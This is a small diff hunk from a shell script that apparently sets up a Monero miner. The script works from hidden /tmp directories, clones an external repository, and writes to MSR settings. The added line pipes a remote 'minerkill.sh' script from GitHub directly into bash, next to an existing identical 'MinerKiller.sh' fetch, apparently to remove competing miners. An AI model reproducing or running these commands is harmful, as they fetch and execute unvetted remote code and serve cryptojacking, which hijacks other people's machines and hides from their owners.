@@ -380,6 +380,8 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; git clone https://github.com/alfonmga/hi
 
 #BotKiller
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
+curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
+
 
 optimize_func() {
   MSR_FILE=/sys/module/msr/parameters/allow_writes
